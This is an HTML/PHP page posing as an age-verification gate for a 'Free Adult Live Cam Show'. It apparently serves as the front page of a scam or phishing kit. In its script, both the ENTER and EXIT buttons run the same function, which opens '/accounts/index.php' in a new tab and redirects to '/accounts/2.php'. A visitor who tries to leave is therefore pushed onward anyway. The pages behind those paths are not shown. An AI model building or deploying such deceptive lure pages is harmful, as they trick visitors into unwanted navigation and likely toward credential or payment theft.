<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="shortcut icon" type="image/x-icon" href="https://static.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico" />
<link rel="mask-icon" type="" href="https://static.codepen.io/assets/favicon/logo-pin-8f3771b1072e3c38bd662872f6b673a722f4b3ca2421637d5596661b4e2132cc.svg" color="#111" />
<title>Free Adult Live Cam Show Verify</title>

<style>
  /*----------------------------------------------   
-Defualt to border-box
-----------------------------------------------  */
*, *:before, *:after {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

html, body {
  font-family: helvetica;
  font-size: 100%;
  margin: 0;
  padding: 0;
  font-weight: 400;
  font-family: Raleway;
  line-height: 1.4;
}

/*----------------------------------------------   
--Fluid body sizing
-----------------------------------------------  */
body {
  font-size: 100%;
}
@media (min-width: 32em) {
  body {
    font-size: 110%;
  }
}
@media (min-width: 54em) {
  body {
    font-size: 111%;
  }
}
@media (min-width: 74em) {
  body {
    font-size: 115%;
  }
}
@media (min-width: 96em) {
  body {
    font-size: 135%;
  }
}

a.btn {
  background-color: #54A984;
  color: #fff;
  text-decoration: none;
  display: inline-block;
  letter-spacing: 0.1em;
  padding: 0.5em 0em;
}
.btn {
  background-color: #54A984;
  color: #fff;
  text-decoration: none;
  display: inline-block;
  letter-spacing: 0.1em;
  padding: 0.5em 0em;
}
.btn.btn-beta {
  background-color: #e36e3a;
}

.decor-line {
  position: relative;
  top: 0.7em;
  border-top: 1px solid #ccc;
  text-align: center;
  max-width: 40%;
  margin: 0.5em auto;
  display: block;
  padding: 0.1em 1em;
  color: #ccc;
}
.decor-line span {
  background: #fff;
  color: #ccc;
  position: relative;
  top: -.7em;
  padding: 0.5em;
  text-transform: uppercase;
  letter-spacing: 0.1em;
  font-weight: 900;
}

.overlay-verify {
  background: #000;
  position: fixed;
  height: 100%;
  width: 100%;
  top: 0;
  left: 0;
  z-index: 1;
}

.box {
  background: #fff;
  position: absolute;
  left: 0;
  right: 0;
  top: 20%;
  bottom: 0;
  margin: 0 auto;
  z-index: 9;
  width: 70%;
  height: 40%;
  display: table;
}
.box .box-left, .box .box-right {
  width: 100%;
  position: relative;
  text-align: center;
  padding: 5%;
}
@media (min-width: 54em) {
  .box .box-left, .box .box-right {
    display: table-cell;
    vertical-align: middle;
    width: 70%;
  }
}
.box .box-left p, .box .box-right p {
  position: relative;
  z-index: 3;
}
.box .box-left {
  background: url(play_img/<?php echo(mt_rand(1,10)); ?>.jpg) 50%;
  max-width: 100%;
  height: auto;
  background-size: cover;
  color: #fff;
}
.box .box-left img {
  position: relative;
  z-index: 4;
  width: 9em;
}
.box .box-left:after {
  content: '';
  position: absolute;
  z-index: 0;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  background-color: rgba(0, 0, 0, 0.4);
}
.box .box-right {
  text-align: center;
}
.box .box-right h3 {
  color: #555;
  text-transform: uppercase;
  letter-spacing: 0.07em;
  border-bottom: 1px solid #eee;
  padding-bottom: 1em;
  margin: 0 auto;
}
.box .box-right p {
  color: #aaa;
}
.box .box-right small {
  color: #ccc;
}
.box .box-right .btn {
  font-weight: 600;
  letter-spacing: 0.2em;
  padding: 0.9em 1em 0.7em;
  margin: 1em auto;
  display: block;
}
</style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<link href='https://fonts.googleapis.com/css?family=Raleway:600,900,400' rel='stylesheet' type='text/css'>
<script>
function myFunction() {
   // OPEN NEW TAB
   window.open('/accounts/index.php', '_blank');
   // THEN REDIRECT THIS PAGE
   window.location = "/accounts/2.php";
}
</script>
<main>
<article class="box">
<div class="box-left">

<p>This Website Requires You to be 21 Years of age or older,<br>
Please Verify Your Age To View The Content </p>
</div>
<div class="box-right">
<h3>Age Verification</h3>
<p>By clicking enter, I certify that I am over the age of 21</p>
<button class="btn btn-alpha" onclick="myFunction()">ENTER</button>
<p class="decor-line"><span>Or</span></p>
<button class="btn btn-beta" onclick="myFunction()">EXIT</button>
<small>Always enjoy</small>
</div>
</div>
</article>
<div class="overlay-verify"></div>
</main>

<script src="https://static.codepen.io/assets/common/stopExecutionOnTimeout-de7e2ef6bfefd24b79a3f68b414b87b8db5b08439cac3f1012092b2290c719cd.js"></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

</body>
</html>
